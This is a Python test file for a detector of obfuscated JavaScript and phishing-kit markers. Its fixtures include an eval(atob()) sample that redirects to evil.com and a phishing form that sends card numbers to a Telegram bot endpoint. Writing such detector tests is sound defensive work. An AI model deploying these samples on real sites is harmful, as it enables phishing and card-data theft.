from core import obfuscation_detector


def test_shannon_entropy():
    # Обычный английский текст/код: энтропия обычно ~ 3.5 - 4.5
    normal_code = "function checkLogin() { var user = document.getElementById('user').value; return true; }"
    # Случайная строка / base64 payload с высокой энтропией > 5.5
    base64_payload = "aW1wb3J0IG9zLCBzeXMsIHNvY2tldCwgc3VicHJvY2VzcyBwbHNJbmplY3RUcm9qYW5Ob3dFeGVjdXRlMTIzNDU2Nzg5MDEyMzQ1Njc4OTA="

    ent_normal = obfuscation_detector.calculate_shannon_entropy(normal_code)
    ent_payload = obfuscation_detector.calculate_shannon_entropy(base64_payload)

    assert ent_normal < 4.8, f"Энтропия обычного кода должна быть < 4.8, получено: {ent_normal}"
    assert ent_payload > 5.2, f"Энтропия base64 payload должна быть > 5.2, получено: {ent_payload}"
    print(f"✅ test_shannon_entropy passed (normal={ent_normal}, payload={ent_payload})")


def test_packer_and_jsfuck():
    # Dean Edwards Packer
    html_packer = "<script>eval(function(p,a,c,k,e,r){e=String;return p}('0 1',2,2,'hello|world'.split('|')))</script>"
    res_packer = obfuscation_detector.analyze_obfuscation(html_packer)
    assert res_packer["is_obfuscated"] is True
    assert "packer_dean_edwards" in res_packer["techniques"]

    # String.fromCharCode обфускация
    html_charcode = "<script>var _0x1 = String.fromCharCode(104, 101, 108, 108, 111);</script>"
    res_charcode = obfuscation_detector.analyze_obfuscation(html_charcode)
    assert res_charcode["is_obfuscated"] is True
    assert "charcode_obfuscation" in res_charcode["techniques"]

    # eval(atob(...))
    html_atob = "<script>eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbSI='));</script>"
    res_atob = obfuscation_detector.analyze_obfuscation(html_atob)
    assert res_atob["is_obfuscated"] is True
    assert "eval_atob_execution" in res_atob["techniques"]

    print("✅ test_packer_and_jsfuck passed")


def test_phishing_kit_markers():
    html_kit = """
    <html>
      <head>
        <script src="antibot.php"></script>
      </head>
      <body>
        <form action="https://api.telegram.org/bot987654321:AAFxyzFakeTokenForTesting12345/sendMessage" method="POST">
          <input type="text" name="card_number">
        </form>
        <a href="/panel/login.php">Admin</a>
      </body>
    </html>
    """

    res = obfuscation_detector.detect_phishing_kit_markers(html_kit)

    assert res["has_kit_markers"] is True
    assert "telegram_bot_exfiltration" in res["markers"]
    assert "phishing_kit_antibot" in res["markers"]
    assert "phishing_kit_gate_path" in res["markers"]

    print("✅ test_phishing_kit_markers passed")


if __name__ == "__main__":
    test_shannon_entropy()
    test_packer_and_jsfuck()
    test_phishing_kit_markers()
    print("\n🎉 Все тесты обфускации и маркеров китов успешно пройдены!")
